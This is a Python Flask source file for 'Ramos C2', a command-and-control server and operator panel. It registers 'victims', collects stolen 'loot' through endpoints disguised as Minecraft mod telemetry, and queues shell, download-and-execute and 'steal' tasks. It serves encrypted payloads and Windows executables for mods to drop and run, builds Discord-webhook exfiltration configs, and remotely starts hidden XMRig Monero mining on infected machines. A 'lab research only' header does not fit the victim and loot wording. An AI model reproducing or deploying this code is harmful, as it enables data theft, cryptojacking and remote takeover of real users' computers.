"""Ramos C2 + SaaS panel — lab intake, victim registry, tasking, XMRig control.
Authorized lab research only. Run on YOUR VPS, test only against boxes you own.

Miner: open-source XMRig (https://github.com/xmrig/xmrig, GPL).
This repo does NOT vendor XMRig source — the panel serves an official
XMRig Windows build you placed next to this file as xmrig.exe, plus a
generated config.json. Start/stop is task-driven and reversible.
"""
import os, json, datetime, re, base64, zlib, uuid as _uuid
from functools import wraps
from flask import Flask, request, jsonify, send_from_directory, Response

app = Flask(__name__)
HERE = os.path.dirname(os.path.abspath(__file__))
LOOT = os.path.join(HERE, "loot")
os.makedirs(LOOT, exist_ok=True)
RES = os.path.join(LOOT, "results")
os.makedirs(RES, exist_ok=True)

VICTIMS_F = os.path.join(LOOT, "victims.json")
TASKS_F = os.path.join(LOOT, "tasks.json")
MINER_F = os.path.join(LOOT, "miner.json")
XMRIG_BIN = os.path.join(HERE, "xmrig.exe")

def log(msg):
    print(f"[{datetime.datetime.now().isoformat(timespec='seconds')}] {msg}", flush=True)

# ---- master key (SaaS login). No user accounts, one shared secret.
# Order: env MASTER_KEY / PANEL_MASTER_KEY, then /root/.ramos_panel_key file.
def load_master():
    for k in ("MASTER_KEY", "PANEL_MASTER_KEY"):
        v = os.environ.get(k, "").strip()
        if v:
            return v
    for p in ("/root/.ramos_panel_key", os.path.join(HERE, ".panel_key")):
        try:
            if os.path.isfile(p):
                v = open(p).read().strip().split()[0]
                if len(v) >= 8:
                    return v
        except Exception:
            pass
    return ""

MASTER = load_master()
if MASTER:
    log("panel: master key loaded (SaaS login enabled)")
else:
    log("panel: WARNING no master key found — /api/* returns 501 until MASTER_KEY is set")

def require_master(fn):
    @wraps(fn)
    def w(*a, **kw):
        if not MASTER:
            return jsonify({"status": "no-master-key"}), 501
        got = request.headers.get("X-Master-Key", "") or request.args.get("key", "")
        if not got.startswith("Bearer "):
            pass
        else:
            got = got[7:]
        if got != MASTER:
            return jsonify({"status": "forbidden"}), 403
        return fn(*a, **kw)
    return w

# ---- tiny json stores (no database, nothing else stored server-side)
def _load_json(path, default):
    try:
        if os.path.isfile(path):
            return json.load(open(path))
    except Exception:
        pass
    return default

def _save_json(path, obj):
    tmp = path + ".tmp"
    try:
        json.dump(obj, open(tmp, "w"), indent=1)
        os.replace(tmp, path)
    except Exception as e:
        log(f"save {path} failed: {e}")

def victims():
    return _load_json(VICTIMS_F, {})

def save_victims(v):
    _save_json(VICTIMS_F, v)

def tasks():
    return _load_json(TASKS_F, {})

def save_tasks(t):
    _save_json(TASKS_F, t)

def miner_defaults():
    d = _load_json(MINER_F, {})
    d.setdefault("pool", "")
    d.setdefault("wallet", "")
    d.setdefault("threads", 0)      # 0 = xmrig auto
    d.setdefault("cpu_max", 50)     # % hint 1-100
    d.setdefault("donate", 1)       # xmrig minimum
    return d

def touch_victim(vid, ip=None, sysinfo=None, counts=None, miner=None, extra=None):
    v = victims()
    e = v.get(vid, {"first_seen": datetime.datetime.now().isoformat(),
                    "beacons": 0})
    e["last_seen"] = datetime.datetime.now().isoformat()
    e["beacons"] = int(e.get("beacons", 0)) + 1
    if ip:
        e["ip"] = ip
    if sysinfo is not None:
        e["sysinfo"] = sysinfo
    if counts is not None:
        e["loot_counts"] = counts
        e["records"] = sum(counts.values()) if isinstance(counts, dict) else 0
    if miner is not None:
        e["miner"] = miner
    if extra:
        e.update(extra)
    v[vid] = e
    save_victims(v)
    return e

def queue_task(vid, ttype, args=None):
    t = tasks()
    tid = _uuid.uuid4().hex[:12]
    job = {"id": tid, "type": ttype, "args": args or {},
           "ts": datetime.datetime.now().isoformat(), "done": False}
    t.setdefault(vid, []).append(job)
    t[vid] = t[vid][-50:]  # cap per victim
    save_tasks(t)
    log(f"task {ttype} -> {vid} ({tid})")
    return job

def pop_tasks(vid):
    t = tasks()
    pending = [j for j in t.get(vid, []) if not j.get("done")]
    return pending

def mark_done(vid, tid, output=None):
    t = tasks()
    for j in t.get(vid, []):
        if j["id"] == tid:
            j["done"] = True
            j["done_ts"] = datetime.datetime.now().isoformat()
            if output is not None:
                j["output_tail"] = str(output)[:2000]
    save_tasks(t)
    if output is not None:
        try:
            vd = os.path.join(RES, re.sub(r"[^A-Za-z0-9_.-]", "_", vid)[:64])
            os.makedirs(vd, exist_ok=True)
            open(os.path.join(vd, tid + ".json"), "w").write(
                json.dumps({"ts": datetime.datetime.now().isoformat(),
                            "victim": vid, "task": tid,
                            "output": str(output)[:20000]}))
        except Exception:
            pass

def decode_loot_counts(data):
    """Best-effort decode of loot_b64 (zlib+json) -> {category: count} + sysinfo."""
    try:
        raw = data.get("loot_b64", "")
        if not raw:
            return None, None
        loot = json.loads(zlib.decompress(base64.b64decode(raw)).decode())
        counts = {k: len(v) for k, v in loot.items()} if isinstance(loot, dict) else None
        sysinfo = (loot.get("sysinfo") or [None])[0] if isinstance(loot, dict) else None
        return counts, sysinfo
    except Exception:
        return None, None

def backfill_victims():
    """First boot: harvest existing shard_*.json tails so the panel
    shows history before boxes beacon again."""
    try:
        if victims():
            return
        found = 0
        for fn in os.listdir(LOOT):
            if not (fn.startswith("shard_") and fn.endswith(".json")):
                continue
            vid = fn[len("shard_"):-len(".json")][:64]
            try:
                lines = open(os.path.join(LOOT, fn)).read().strip().split("\n")
                last = json.loads(lines[-1]) if lines and lines[0].strip() else {}
                data = last.get("data", {}) or {}
                counts, sysinfo = decode_loot_counts(data)
                touch_victim(vid, ip=last.get("ip"), sysinfo=sysinfo,
                             counts=counts)
                found += 1
            except Exception:
                continue
        if found:
            log(f"panel: backfilled {found} victims from shard history")
    except Exception as e:
        log(f"panel: backfill failed: {e}")

backfill_victims()

# ============================================================ intake (compat)
@app.route("/shard/prefireMc", methods=["POST"])
def prefire():
    data = request.get_json(force=True, silent=True) or {}
    prefire_id = os.urandom(8).hex()
    log(f"prefire from {request.remote_addr} user={data.get('userId')} session={str(data.get('sessionId'))[:16]}... -> {prefire_id}")
    return jsonify({"prefireId": prefire_id})

@app.route("/shard", methods=["GET", "POST"])
def shard():
    if request.method == "GET":
        return jsonify({"status": "ok"})
    data = request.get_json(force=True, silent=True) or {}
    uid = str(data.get("userId", "unknown"))[:64]
    log(f"shard_post from {uid} keys={list(data.keys())}")
    with open(os.path.join(LOOT, f"shard_{uid}.json"), "a") as f:
        f.write(json.dumps({"ts": datetime.datetime.now().isoformat(), "ip": request.remote_addr, "data": data}) + "\n")
    counts, sysinfo = decode_loot_counts(data)
    touch_victim(uid, ip=request.remote_addr, sysinfo=sysinfo, counts=counts)
    return jsonify({"status": "ok"})

@app.route("/submit", methods=["POST"])
def submit():
    uid = str(request.form.get("userId", "unknown"))[:64]
    for key, f in request.files.items():
        path = os.path.join(LOOT, f"{uid}_{key}_{f.filename}")
        f.save(path)
        log(f"loot {path} ({os.path.getsize(path)} bytes)")
    if request.is_json:
        data = request.get_json(silent=True) or {}
        with open(os.path.join(LOOT, f"loot_{uid}.json"), "a") as fh:
            fh.write(json.dumps(data) + "\n")
        log(f"json loot from {uid}: {list(data.keys())}")
    touch_victim(uid, ip=request.remote_addr)
    return jsonify({"status": "ok"})

@app.route("/shard/submitMinecraftLog", methods=["POST"])
def mc_log():
    data = request.get_json(force=True, silent=True) or {}
    uid = str(data.get("userId", "unknown"))[:64]
    with open(os.path.join(LOOT, f"mc_{uid}.log"), "a", encoding="utf-8", errors="replace") as f:
        f.write(f"\n===== {datetime.datetime.now().isoformat()} {request.remote_addr} =====\n")
        f.write(data.get("content", "")[:1_000_000])
    log(f"minecraft log from {uid} ({len(data.get('content',''))} bytes)")
    return jsonify({"status": "ok"})

@app.route("/loot/<path:name>", methods=["GET"])
@require_master
def get_loot(name):
    return send_from_directory(LOOT, name)

# ============================================================ agent (beacon+tasking)
@app.route("/agent/checkin", methods=["POST"])
def agent_checkin():
    """Persistent-agent beacon. {victim_id, sysinfo?, miner?} -> {tasks:[...]}."""
    data = request.get_json(force=True, silent=True) or {}
    vid = str(data.get("victim_id") or data.get("userId") or "unknown")[:64]
    miner = data.get("miner")
    sysinfo = data.get("sysinfo")
    counts = data.get("counts")
    touch_victim(vid, ip=request.remote_addr, sysinfo=sysinfo, counts=counts, miner=miner,
                 extra={"agent": True})
    pending = pop_tasks(vid)
    log(f"agent {vid} beacon miner={miner} tasks={len(pending)}")
    return jsonify({"status": "ok", "tasks": pending})

@app.route("/agent/result", methods=["POST"])
def agent_result():
    data = request.get_json(force=True, silent=True) or {}
    vid = str(data.get("victim_id") or data.get("userId") or "unknown")[:64]
    tid = str(data.get("task_id") or data.get("id") or "")[:32]
    out = data.get("output", "")
    mark_done(vid, tid, out)
    if isinstance(data.get("miner"), dict):
        touch_victim(vid, miner=data["miner"])
    log(f"agent {vid} result {tid} ({len(str(out))} bytes)")
    return jsonify({"status": "ok"})

# ============================================================ miner (open-source XMRig)
# Source: https://github.com/xmrig/xmrig (GPL). Panel serves an official
# Windows build placed here as xmrig.exe + a generated config.json.
# Agent downloads, runs hidden (no admin), stops on task. Reversible.
@app.route("/miner/xmrig.exe", methods=["GET"])
def miner_bin():
    if not os.path.isfile(XMRIG_BIN):
        return jsonify({"status": "no-miner"}), 404
    return send_from_directory(HERE, "xmrig.exe")

@app.route("/mod/tool", methods=["GET"])
def mod_tool():
    """Helper binaries for lab mods (e.g. ?name=chromelevator_x64.exe).
    Served over the pinned channel; mod drops them next to the payload."""
    import re as _re
    name = request.args.get("name", "")
    if not _re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
        return jsonify({"status": "bad-name"}), 400
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    if not os.path.isfile(path):
        return jsonify({"status": "no-tool"}), 404
    return send_from_directory(os.path.dirname(path), name)

def build_xmrig_config(pool, wallet, threads=0, cpu_max=50, donate=1):
    cfg = {
        "api": {"id": None, "worker-id": None},
        "http": {"enabled": False},
        "autosave": False,
        "background": False,
        "colors": False,
        "donate-level": max(1, int(donate or 1)),
        "cpu": {
            "enabled": True,
            "huge-pages": False,
            "max-threads-hint": int(threads or 0) or 50,
            "max-cpu-usage": max(1, min(100, int(cpu_max or 50))),
        },
        "pools": [{"url": pool, "user": wallet, "keepalive": True, "tls": False}],
    }
    return cfg

@app.route("/miner/config", methods=["GET"])
def miner_config():
    """Per-victim xmrig config. Query may override stored defaults
    (operator preview uses master key; agent fetch is plain)."""
    d = miner_defaults()
    pool = request.args.get("pool", d["pool"])
    wallet = request.args.get("wallet", d["wallet"])
    try:
        threads = int(request.args.get("threads", d["threads"] or 0))
    except Exception:
        threads = 0
    try:
        cpu_max = int(request.args.get("cpu", d["cpu_max"] or 50))
    except Exception:
        cpu_max = 50
    if not pool or not wallet:
        return jsonify({"status": "no-miner-config",
                        "hint": "set pool+wallet via panel or ?pool=&wallet="}), 404
    return jsonify(build_xmrig_config(pool, wallet, threads, cpu_max, d.get("donate", 1)))

# ============================================================ SaaS API (master key)
@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.get_json(force=True, silent=True) or {}
    key = data.get("key", "") or request.headers.get("X-Master-Key", "")
    if MASTER and key == MASTER:
        return jsonify({"ok": True})
    return jsonify({"ok": False}), 403

@app.route("/api/victims", methods=["GET"])
@require_master
def api_victims():
    v = victims()
    rows = []
    for vid, e in sorted(v.items(), key=lambda kv: kv[1].get("last_seen", ""), reverse=True):
        rows.append({"id": vid, "last_seen": e.get("last_seen"),
                     "first_seen": e.get("first_seen"), "ip": e.get("ip"),
                     "sysinfo": e.get("sysinfo"), "loot_counts": e.get("loot_counts"),
                     "records": e.get("records", 0), "miner": e.get("miner"),
                     "beacons": e.get("beacons", 0), "agent": bool(e.get("agent"))})
    return jsonify({"victims": rows, "miner_defaults": miner_defaults(),
                    "xmrig_present": os.path.isfile(XMRIG_BIN)})

@app.route("/api/victim/<vid>", methods=["GET"])
@require_master
def api_victim(vid):
    v = victims().get(vid)
    if not v:
        return jsonify({"status": "no-victim"}), 404
    t = tasks().get(vid, [])
    # loot preview: last shard line, counts only (full files via /loot/)
    preview = None
    try:
        p = os.path.join(LOOT, f"shard_{vid}.json")
        if os.path.isfile(p):
            lines = open(p).read().strip().split("\n")
            last = json.loads(lines[-1]) if lines else {}
            preview = {"ts": last.get("ts"), "keys": list((last.get("data") or {}).keys())}
    except Exception:
        pass
    vd = os.path.join(RES, re.sub(r"[^A-Za-z0-9_.-]", "_", vid)[:64])
    results = []
    try:
        if os.path.isdir(vd):
            for fn in sorted(os.listdir(vd))[-20:]:
                try:
                    results.append(json.load(open(os.path.join(vd, fn))))
                except Exception:
                    pass
    except Exception:
        pass
    return jsonify({"victim": dict({"id": vid}, **v), "tasks": t[-20:],
                    "preview": preview, "results": results[-10:]})

@app.route("/api/task", methods=["POST"])
@require_master
def api_task():
    data = request.get_json(force=True, silent=True) or {}
    vid = str(data.get("victim_id", ""))[:64]
    ttype = str(data.get("type", ""))[:32]
    args = data.get("args", {}) or {}
    if not vid or ttype not in ("shell", "miner_start", "miner_stop",
                                "download_exec", "steal", "raw"):
        return jsonify({"status": "bad-task"}), 400
    # fill miner_start blanks from stored defaults
    if ttype == "miner_start":
        d = miner_defaults()
        args.setdefault("pool", d["pool"])
        args.setdefault("wallet", d["wallet"])
        args.setdefault("threads", d["threads"])
        args.setdefault("cpu", d["cpu_max"])
        if not args.get("pool") or not args.get("wallet"):
            return jsonify({"status": "no-miner-config",
                            "hint": "set pool+wallet first"}), 400
    job = queue_task(vid, ttype, args)
    return jsonify({"status": "queued", "task": job})

@app.route("/api/miner", methods=["GET", "POST"])
@require_master
def api_miner():
    if request.method == "GET":
        return jsonify(miner_defaults())
    data = request.get_json(force=True, silent=True) or {}
    # POST has two shapes: defaults update {pool,wallet,...} OR per-victim
    # action {victim_id, action: start|stop}.
    if data.get("victim_id") and data.get("action"):
        vid = str(data["victim_id"])[:64]
        act = data["action"]
        if act == "start":
            d = miner_defaults()
            args = {"pool": data.get("pool") or d["pool"],
                    "wallet": data.get("wallet") or d["wallet"],
                    "threads": data.get("threads", d["threads"]),
                    "cpu": data.get("cpu", d["cpu_max"])}
            if not args["pool"] or not args["wallet"]:
                return jsonify({"status": "no-miner-config"}), 400
            return jsonify({"status": "queued",
                            "task": queue_task(vid, "miner_start", args)})
        elif act == "stop":
            return jsonify({"status": "queued",
                            "task": queue_task(vid, "miner_stop", {})})
        return jsonify({"status": "bad-action"}), 400
    d = miner_defaults()
    for k in ("pool", "wallet", "threads", "cpu_max", "donate"):
        if k in data:
            d[k] = data[k]
    _save_json(MINER_F, d)
    return jsonify({"status": "saved", "miner": d})

# ============================================================ mod endpoints (compat)
PANEL_PAYLOAD = os.path.join(os.path.dirname(os.path.abspath(__file__)), "payload.dat")

@app.route("/mod/fetch", methods=["GET"])
def mod_fetch():
    """Sealed Python payload for lab mods (packed by tools/make_payload.py:
    BH01 magic + iv(12) + tag(16) + ciphertext). Mod decrypts with panel key
    inside the pinned channel and runs it."""
    import base64 as _b
    if not os.path.isfile(PANEL_PAYLOAD):
        return jsonify({"status": "no-payload"}), 404
    blob = open(PANEL_PAYLOAD, "rb").read()
    if len(blob) < 32 or blob[:4] != b"BH01":
        return jsonify({"status": "bad-payload"}), 500
    return jsonify({"iv": _b.b64encode(blob[4:16]).decode(),
                    "tag": _b.b64encode(blob[16:32]).decode(),
                    "data": _b.b64encode(blob[32:]).decode()})

@app.route("/mod/submit", methods=["POST"])
def mod_submit():
    data = request.get_json(force=True, silent=True) or {}
    uid = str(data.get("userId", "unknown"))[:64] + "-modloot"
    with open(os.path.join(LOOT, f"modloot_{uid}.json"), "a") as fh:
        fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
                             "ip": request.remote_addr, "size": len(str(data))}) + "\n")
    log(f"mod loot from {uid}")
    return jsonify({"status": "ok"})

@app.route("/mod/exe", methods=["GET"])
def mod_exe():
    """Standalone Windows payload (no python needed on the box).
    Served over the pinned channel; mod drops and executes it."""
    name = request.args.get("name", "vw_webhook.exe")
    if not re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
        return jsonify({"status": "bad-name"}), 400
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    if not os.path.isfile(path):
        return jsonify({"status": "no-exe"}), 404
    return send_from_directory(os.path.dirname(path), name)

@app.route("/mod/cfg", methods=["GET"])
def mod_cfg():
    """Operator-specific sealed config for staged loaders.
    ?w=<webhook> -> ENC1-sealed bh_config.bin the payload honors at runtime."""

    w = request.args.get("w", "")
    name = request.args.get("name", "bh_config.bin")
    if not re.match(r"^[A-Za-z0-9_.-]{1,64}$", name):
        return jsonify({"status": "bad-name"}), 400
    raw_cfg = b""
    if w:
        if not re.match(r"^https://discord\.com/api/webhooks/[0-9]{5,30}/[A-Za-z0-9_-]{10,120}$", w):
            return jsonify({"status": "bad-webhook"}), 400
        raw_cfg = ("kind=webhook\ntarget=%s\n" % w).encode()
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), name)
    if raw_cfg:
        k = os.urandom(16)
        x = bytes(b ^ k[i % 16] for i, b in enumerate(raw_cfg))
        return (b"ENC1" + k + x, 200, {"Content-Type": "application/octet-stream"})
    if not os.path.isfile(path):
        return jsonify({"status": "no-cfg"}), 404
    return send_from_directory(os.path.dirname(path), name)

@app.route("/mod/checkin", methods=["POST"])
def mod_checkin():
    """Pinned-TLS lab-mod check-in. Body is an AES-GCM envelope
    {key, iv, data} (base64); key unwrap happens inside the pinned channel.
    Lab operators: replace TODO key handling with your KMS of choice."""
    import base64 as _b
    from Crypto.Cipher import AES as _AES
    data = request.get_json(force=True, silent=True) or {}
    try:
        key = _b.b64decode(data["key"])
        iv = _b.b64decode(data["iv"])
        ct = _b.b64decode(data["data"])
        pt = _AES.new(key, _AES.MODE_GCM, iv).decrypt(ct)[:-16]
        inner = json.loads(pt.decode())
        uid = str(inner.get("user", "unknown"))[:64] + "-mod"
        with open(os.path.join(LOOT, f"mod_{uid}.json"), "a") as fh:
            fh.write(json.dumps({"ts": datetime.datetime.now().isoformat(),
                                 "ip": request.remote_addr, "data": inner}) + "\n")
        touch_victim(uid, ip=request.remote_addr,
                     extra={"mod_user": inner.get("user"), "uuid": inner.get("uuid")})
        log(f"mod check-in from {uid} uuid={inner.get('uuid')}")
        return jsonify({"status": "ok"})
    except Exception as e:
        log(f"mod check-in failed: {str(e)[:80]}")
        return jsonify({"status": "error"}), 400

# ============================================================ SaaS panel UI
PANEL_HTML = """<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<title>Ramos C2 — panel</title>
<style>
body{background:#0d1117;color:#c9d1d9;font-family:monospace;padding:20px;max-width:1100px;margin:0 auto}
h1{color:#f85149}h2{color:#58a6ff;border-bottom:1px solid #30363d;padding-bottom:6px}
table{border-collapse:collapse;width:100%;margin:12px 0}
td,th{border:1px solid #30363d;padding:6px 10px;text-align:left;font-size:13px}
th{background:#161b22}a{color:#58a6ff}
input,select,button{background:#161b22;color:#c9d1d9;border:1px solid #30363d;
 padding:8px 12px;border-radius:6px;font-family:inherit;font-size:13px}
button{cursor:pointer}button:hover{border-color:#58a6ff}
.row{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}
.card{border:1px solid #30363d;border-radius:8px;padding:14px;margin:12px 0;background:#0d1117}
.ok{color:#3fb950}.bad{color:#f85149}.dim{color:#8b949e}
#login{max-width:420px;margin:80px auto;text-align:center}
pre{background:#161b22;padding:12px;border-radius:6px;overflow:auto;max-height:300px;font-size:12px}
.pill{display:inline-block;padding:2px 10px;border-radius:10px;font-size:11px}
.on{background:#1a3a24;color:#3fb950}.off{background:#3a1a1a;color:#f85149}
</style></head><body>
<div id=login>
<h1>&#128293; RAMOS C2</h1>
<p class=dim>lab panel — master key required</p>
<input type=password id=key placeholder="master key" style="width:100%;margin:8px 0">
<br><button onclick="login()">UNLOCK</button>
<p id=lerr class=bad></p>
<p class=dim style="font-size:11px">miner: open-source XMRig
(<a href="https://github.com/xmrig/xmrig">github.com/xmrig/xmrig</a>) · start/stop per victim</p>
</div>
<div id=app style="display:none">
<h1>&#128293; RAMOS C2 <span class=dim style="font-size:13px">saas panel</span></h1>
<div class=row>
<button onclick="load()">&#10227; REFRESH</button>
<span id=xmrig class=dim></span>
</div>
<h2>miner defaults</h2>
<div class=card><div class=row>
<input id=mpool placeholder="pool  (e.g. gulf.moneroocean.stream:10128)" style="flex:2;min-width:260px">
<input id=mwallet placeholder="wallet (XMR address)" style="flex:2;min-width:260px">
<input id=mcpu placeholder="cpu% (1-100)" style="width:110px">
<button onclick="saveMiner()">SAVE</button>
</div><p class=dim style="font-size:11px">used when you hit START without overrides.
xmrig.exe served from panel · config generated per victim · donate-level 1 (upstream minimum).</p></div>
<h2>victims</h2>
<table><tr><th>victim</th><th>last seen</th><th>ip</th><th>records</th><th>miner</th><th>ops</th></tr>
<tbody id=vt></tbody></table>
<h2>detail</h2>
<div class=card><div class=row>
<input id=vid placeholder="victim id" style="flex:1;min-width:200px">
<button onclick="detail()">OPEN</button>
</div><div id=det class=dim>pick a victim above.</div></div>
<h2>shell / task</h2>
<div class=card><div class=row>
<input id=tv placeholder="victim id" style="flex:1;min-width:160px">
<select id=tt><option value=shell>shell</option><option value=miner_start>miner_start</option>
<option value=miner_stop>miner_stop</option><option value=download_exec>download_exec</option>
<option value=steal>steal (re-run)</option></select>
<input id=ta placeholder='args json (e.g. {"cmd":"whoami"})' style="flex:2;min-width:240px">
<button onclick="sendTask()">QUEUE</button>
</div><pre id=tres></pre></div>
</div>
<script>
let K=localStorage.getItem('ramos_master')||'';
if(K){document.getElementById('key').value=K;}
const H=()=>({'Content-Type':'application/json','X-Master-Key':K});
async function login(){
 K=document.getElementById('key').value.trim();
 const r=await fetch('/api/login',{method:'POST',headers:H(),body:JSON.stringify({key:K})});
 if(r.ok){localStorage.setItem('ramos_master',K);
  document.getElementById('login').style.display='none';
  document.getElementById('app').style.display='block';load();}
 else document.getElementById('lerr').textContent='wrong key';
}
async function load(){
 const r=await fetch('/api/victims',{headers:H()});if(!r.ok)return;
 const d=await r.json();
 document.getElementById('xmrig').textContent='xmrig.exe: '+(d.xmrig_present?'present':'MISSING — drop official build next to c2_server.py');
 if(d.miner_defaults){document.getElementById('mpool').value=d.miner_defaults.pool||'';
  document.getElementById('mwallet').value=d.miner_defaults.wallet||'';
  document.getElementById('mcpu').value=d.miner_defaults.cpu_max||50;}
 let h='';
 for(const v of d.victims){
  const m=v.miner&&v.miner.running;
  h+='<tr><td><a href=# onclick="openV(\\''+v.id+'\\')">'+v.id+'</a></td><td>'+(v.last_seen||'?')+'</td>'
   +'<td>'+(v.ip||'?')+'</td><td>'+(v.records||0)+'</td>'
   +'<td><span class="pill '+(m?'on':'off')+'">'+(m?'MINING':'idle')+'</span></td>'
   +'<td><button onclick="minerOp(\\''+v.id+'\\',\\'start\\')">start</button> '
   +'<button onclick="minerOp(\\''+v.id+'\\',\\'stop\\')">stop</button></td></tr>';
 }
 document.getElementById('vt').innerHTML=h||'<tr><td colspan=6>no victims yet</td></tr>';
}
function openV(id){document.getElementById('vid').value=id;
 document.getElementById('tv').value=id;detail();}
async function detail(){
 const id=document.getElementById('vid').value.trim();if(!id)return;
 const r=await fetch('/api/victim/'+encodeURIComponent(id),{headers:H()});
 document.getElementById('det').innerHTML='<pre>'+esc(await r.text())+'</pre>';
}
async function sendTask(){
 const vid=document.getElementById('tv').value.trim();if(!vid)return;
 let args={};try{args=JSON.parse(document.getElementById('ta').value||'{}');}catch(e){}
 const type=document.getElementById('tt').value;
 // shell shorthand: {"cmd":"..."} or bare string
 if(type==='shell'&&typeof args==='string')args={cmd:args};
 const r=await fetch('/api/task',{method:'POST',headers:H(),
  body:JSON.stringify({victim_id:vid,type,args})});
 document.getElementById('tres').textContent=await r.text();
}
async function minerOp(vid,action){
 const r=await fetch('/api/miner',{method:'POST',headers:H(),
  body:JSON.stringify({victim_id:vid,action})});
 alert(await r.text());load();
}
async function saveMiner(){
 const r=await fetch('/api/miner',{method:'POST',headers:H(),body:JSON.stringify({
  pool:document.getElementById('mpool').value.trim(),
  wallet:document.getElementById('mwallet').value.trim(),
  cpu_max:parseInt(document.getElementById('mcpu').value||'50')}});
 alert(await r.text());
}
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
</script></body></html>"""

@app.route("/panel", methods=["GET"])
@app.route("/admin", methods=["GET"])
@app.route("/dashboard", methods=["GET"])
def panel():
    if request.path == "/dashboard" and request.args.get("legacy") is None:
        pass  # /dashboard now serves the SaaS panel (was 404)
    return Response(PANEL_HTML, mimetype="text/html")

@app.route("/", methods=["GET"])
def index():
    return ("", 404)

if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--tls-cert", default=None, help="panel.crt for pinned-TLS mod endpoint")
    ap.add_argument("--tls-key", default=None, help="panel.key for pinned-TLS mod endpoint")
    a = ap.parse_args()
    print(f"Ramos C2 listening on 0.0.0.0:{a.port}, loot -> ./loot", flush=True)
    if a.tls_cert and a.tls_key:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(a.tls_cert, a.tls_key)
        app.run(host="0.0.0.0", port=a.port, ssl_context=context)
    else:
        app.run(host="0.0.0.0", port=a.port)
